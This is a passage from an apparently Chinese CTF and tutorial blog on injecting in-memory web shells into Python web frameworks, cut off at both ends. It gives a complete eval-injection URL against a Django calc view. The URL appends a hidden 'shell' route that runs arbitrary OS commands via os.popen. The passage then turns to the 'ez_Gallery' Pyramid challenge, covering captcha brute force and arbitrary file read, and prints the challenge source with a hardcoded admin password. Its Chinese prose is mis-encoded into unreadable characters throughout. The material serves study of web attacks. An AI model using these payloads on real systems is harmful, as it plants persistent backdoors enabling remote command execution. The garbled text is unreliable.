</span></span><span class="line"><span class="cl"><span class="n">urlpatterns</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="n">path</span><span class="p">(</span><span class="s1">&#39;admin/&#39;</span><span class="p">,</span> <span class="n">admin</span><span class="o">.</span><span class="n">site</span><span class="o">.</span><span class="n">urls</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">path</span><span class="p">(</span><span class="s1">&#39;calc&#39;</span><span class="p">,</span> <span class="n">calc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># memshell/views.py</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">django.http</span> <span class="kn">import</span> <span class="n">HttpResponse</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">calc</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;expression&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s1">&#39;&lt;h2&gt;result: </span><span class="si">%s</span><span class="s1">!&lt;/h2&gt;&#39;</span> <span class="o">%</span> <span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è™½ç„¶ <code>Django</code> çš„ä»£ç ç»“æ„ä¸å¤ªç›¸åŒï¼Œä½†ç”±äºæ‰€æœ‰è·¯ç”±éƒ½å®šä¹‰åœ¨ <code>app/urls.py#urlpatterns</code> ä¸­ï¼Œæ‰€ä»¥å¤§ä½“æ€è·¯æ²¡æœ‰ä»€ä¹ˆå·®åˆ«ï¼Œé¦–å…ˆè€ƒè™‘å¦‚ä½•è·å–åˆ°è¿™ä¸ªåˆ—è¡¨ï¼Œç„¶åå†è¿›è¡Œæ“ä½œã€‚</p>
<p>åœ¨ <code>Django</code> ä¸­ï¼Œroot appä¸‹ä¼šæœ‰ä¸€ä¸ª <code>settings.py</code> æ–‡ä»¶ç”¨äºå®šä¹‰åº”ç”¨é…ç½®ï¼Œå…¶ä¸­ <code>ROOT_URLCONF</code> æŒ‡å®šäº†å½“å‰åº”ç”¨è·¯ç”±å…¥å£ï¼Œåœ¨å½“å‰åœºæ™¯ä¸‹çš„ <code>ROOT_URLCONF</code> ä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ROOT_URLCONF</span> <span class="o">=</span> <span class="s1">&#39;memshell.urls&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é¦–å…ˆè€ƒè™‘å¦‚ä½•è·å–åˆ° <code>settings</code> è¿™ä¸ªå¯¹è±¡ï¼Œå¾—ç›Šäºå½“å‰åœºæ™¯ä¸‹å¯ä»¥ä½¿ç”¨ <code>request</code>ï¼Œæ‰€ä»¥ä½¿ç”¨å…¶ä¸­å‡½æ•°çš„ <code>__globals__</code> å±æ€§æ¥è·å–åˆ°å½“å‰çš„å…¨å±€å˜é‡å­—å…¸ï¼Œå…¶ä¸­å°±å¯ä»¥æ‰¾åˆ°ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/calc?expression=request.get_post.__globals__
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰¾åˆ°<code>memshell.settings</code></p>
<p>importå¯¼å…¥å°±èƒ½è·å–åˆ°app</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/calc?expression=__import__(request.get_post.__globals__[&#34;settings&#34;].ROOT_URLCONF)
</span></span></code></pre></td></tr></table>
</div>
</div><p>è·å–åˆ°appå°±èƒ½è·å–urlpatternsæ¥æ“ä½œè·¯ç”±åˆ—è¡¨äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/calc?expression=__import__(request.get_post.__globals__[&#34;settings&#34;].ROOT_URLCONF).urls.urlpatterns
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨è·¯ç”±å®šä¹‰ä¸­ï¼Œæ¯ä¸€æ¡è·¯ç”±éƒ½ä¼šè°ƒç”¨ <code>path</code> å‡½æ•°æ¥è¿›è¡Œå®šä¹‰ï¼Œä¼ å…¥çš„å‚æ•°ç›¸å¯¹ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯ <code>è·¯ç”±ï¼šå‡½æ•°</code> çš„å¯¹åº”ï¼Œç¬¬ä¸€ä¸ªè·¯ç”±å‚æ•°ä¸éœ€è¦è€ƒè™‘ï¼Œä¼ å…¥å­—ç¬¦ä¸²å³å¯ï¼Œéœ€è¦è€ƒè™‘çš„æ˜¯å¦‚ä½•æ„é€ ç¬¬äºŒä¸ªå‚æ•°ï¼ŒæŸ¥çœ‹ <code>path</code> å‡½æ•°å®šä¹‰ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_path</span><span class="p">(</span><span class="n">route</span><span class="p">,</span> <span class="n">view</span><span class="p">,</span> <span class="n">kwargs</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">Pattern</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="kn">from</span> <span class="nn">django.views</span> <span class="kn">import</span> <span class="n">View</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">kwargs</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">kwargs</span><span class="p">,</span> <span class="nb">dict</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">TypeError</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;kwargs argument must be a dict, but got </span><span class="si">{</span><span class="n">kwargs</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__name__</span><span class="si">}</span><span class="s2">.&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">view</span><span class="p">,</span> <span class="p">(</span><span class="nb">list</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># For include(...) processing.</span>
</span></span><span class="line"><span class="cl">        <span class="n">pattern</span> <span class="o">=</span> <span class="n">Pattern</span><span class="p">(</span><span class="n">route</span><span class="p">,</span> <span class="n">is_endpoint</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">urlconf_module</span><span class="p">,</span> <span class="n">app_name</span><span class="p">,</span> <span class="n">namespace</span> <span class="o">=</span> <span class="n">view</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">URLResolver</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">pattern</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">urlconf_module</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">kwargs</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">app_name</span><span class="o">=</span><span class="n">app_name</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">namespace</span><span class="o">=</span><span class="n">namespace</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">callable</span><span class="p">(</span><span class="n">view</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">pattern</span> <span class="o">=</span> <span class="n">Pattern</span><span class="p">(</span><span class="n">route</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">,</span> <span class="n">is_endpoint</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">URLPattern</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">view</span><span class="p">,</span> <span class="n">kwargs</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">view</span><span class="p">,</span> <span class="n">View</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">view_cls_name</span> <span class="o">=</span> <span class="n">view</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__name__</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">TypeError</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;view must be a callable, pass </span><span class="si">{</span><span class="n">view_cls_name</span><span class="si">}</span><span class="s2">.as_view(), not &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">view_cls_name</span><span class="si">}</span><span class="s2">().&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">TypeError</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;view must be a callable or a list/tuple in the case of include().&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…¶ä¸­ä¼šå‘ç° <code>view</code> å‚æ•°é™¤äº†åˆ¤æ–­æ˜¯å¦ä¸º <code>View</code>ã€<code>(list, tuple)</code> ä¹‹å¤–ï¼Œè¿˜åˆ¤æ–­äº†æ˜¯å¦æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œé‚£ä¹ˆè¿™é‡Œå°±æ¯”è¾ƒç®€å•äº†ï¼Œç›´æ¥æ„é€ ä¸€ä¸ª <code>lambda</code> å‡½æ•°å³å¯ã€‚</p>
<p>æ ¹æ®ä¹‹å‰çš„åˆ†æç»“æœï¼Œå¯ä»¥å¾—åˆ°ä¸‹é¢çš„æ„é€ æµç¨‹ï¼š</p>
<ol>
<li>
<p>è·å–app.urlpatterns</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">get_port</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s2">&#34;settings&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">ROOT_URLCONF</span><span class="p">)</span><span class="o">.</span><span class="n">urls</span><span class="o">.</span><span class="n">urlpatterns</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>è°ƒç”¨pathå‡½æ•°ï¼Œè¿”å›ä¸€æ¡æ–°è·¯ç”±</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;django&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">urls</span><span class="o">.</span><span class="n">path</span><span class="p">(</span><span class="s1">&#39;shell&#39;</span><span class="p">,</span><span class="k">lambda</span> <span class="n">request</span><span class="p">:</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;django&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">http</span><span class="o">.</span><span class="n">HttpResponse</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span><span class="s1">&#39;id&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>å½“å‰åœºæ™¯ä¸‹éœ€è¦è¿”å›ä¸€ä¸ª <code>http.HttpResponse</code>ï¼Œæ‰€ä»¥éœ€è¦é¢å¤–å¼•å…¥ <code>django</code> æ¥è¿›è¡Œè°ƒç”¨</p>
</blockquote>
</li>
<li>
<p>å°†æ–°è·¯ç”±appendåˆ°app.urlpatternsä¸­å®ç°å†…å­˜é©¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">calc</span><span class="err">?</span><span class="n">expression</span><span class="o">=</span><span class="nb">__import__</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">get_port</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s2">&#34;settings&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">ROOT_URLCONF</span><span class="p">)</span><span class="o">.</span><span class="n">urls</span><span class="o">.</span><span class="n">urlpatterns</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;django&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">urls</span><span class="o">.</span><span class="n">path</span><span class="p">(</span><span class="s1">&#39;shell&#39;</span><span class="p">,</span><span class="k">lambda</span> <span class="n">request</span><span class="p">:</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;django&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">http</span><span class="o">.</span><span class="n">HttpResponse</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span><span class="s1">&#39;id&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">())))</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ol>
<p>ç„¶åè®¿é—®/shell</p>
<h2 id="pyramid">pyramid
</h2><p>ç›´æ¥ä¸Šä¾‹é¢˜</p>
<h3 id="ç¬¬ä¸€å±Šå›½åŸæ¯ez_gallery">ç¬¬ä¸€å±Šå›½åŸæ¯ez_Gallery
</h3><p>ä¸Šæ¥å…ˆæ˜¯å¼±å£ä»¤çˆ†ç ´ï¼Œæœ‰éªŒè¯ç </p>
<p>ä¸‹é¢ç”¨bpæ’ä»¶æ¥çˆ†ç ´</p>
<h4 id="xiapao">xiapao
</h4><p>ä½¿ç”¨å‚è€ƒï¼š<a class="link" href="https://blog.csdn.net/qq1140037586/article/details/128455338"  target="_blank" rel="noopener"
    >å…¨ç½‘æœ€æ–°ã€æœ€è¯¦ç»†çš„ä½¿ç”¨burpsuiteéªŒè¯ç è¯†åˆ«ç»•è¿‡çˆ†ç ´æ•™ç¨‹ï¼ˆ2023æœ€æ–°ï¼‰_burpsuiteç»•è¿‡éªŒè¯ç -CSDNåšå®¢</a></p>
<p>å¡«å…¥é“¾æ¥ä¸ºéªŒè¯ç å›¾ç‰‡é“¾æ¥ï¼Œç„¶åå¼€å¯æœ¬åœ°éªŒè¯ç è¯†åˆ«æœåŠ¡</p>
<p>ç„¶åæŠŠéªŒè¯ç ä½ç½®æ›¿æ¢ä¸º @xiapao@1@</p>
<p>æœ€ååœ¨æŠŠçº¿ç¨‹è®¾ä¸º 1 å°±èƒ½å¼€å§‹çˆ†ç ´äº†</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>ç›´æ¥è¯»app.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">jinja2</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.config</span> <span class="kn">import</span> <span class="n">Configurator</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.httpexceptions</span> <span class="kn">import</span> <span class="n">HTTPFound</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.response</span> <span class="kn">import</span> <span class="n">Response</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.session</span> <span class="kn">import</span> <span class="n">SignedCookieSessionFactory</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">wsgiref.simple_server</span> <span class="kn">import</span> <span class="n">make_server</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Captcha</span> <span class="kn">import</span> <span class="n">captcha_image_view</span><span class="p">,</span> <span class="n">captcha_store</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">users</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;admin&#34;</span><span class="p">:</span> <span class="n">User</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="s2">&#34;123456&#34;</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">root_view</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># é‡å®šå‘åˆ° /login</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">HTTPFound</span><span class="p">(</span><span class="n">location</span><span class="o">=</span><span class="s1">&#39;/login&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">info_view</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># æŸ¥çœ‹ç»†èŠ‚å†…å®¹</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;è¯·å…ˆç™»å½•&#34;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="mi">403</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">file_name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">file_base</span><span class="p">,</span> <span class="n">file_extension</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">file_name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">file_name</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;/app/static/details/&#39;</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">FileNotFoundError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">content</span> <span class="o">=</span> <span class="s2">&#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="s2">&#34;æœªæä¾›æ–‡ä»¶åã€‚&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;file_name&#39;</span><span class="p">:</span> <span class="n">file_name</span><span class="p">,</span> <span class="s1">&#39;content&#39;</span><span class="p">:</span> <span class="n">content</span><span class="p">,</span> <span class="s1">&#39;file_base&#39;</span><span class="p">:</span> <span class="n">file_base</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">home_view</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ä¸»è·¯ç”±</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;è¯·å…ˆç™»å½•&#34;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="mi">403</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">detailtxt</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s1">&#39;/app/static/details/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">picture_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[:</span><span class="n">i</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">detailtxt</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">file_contents</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">picture</span> <span class="ow">in</span> <span class="n">picture_list</span><span class="p">:</span>
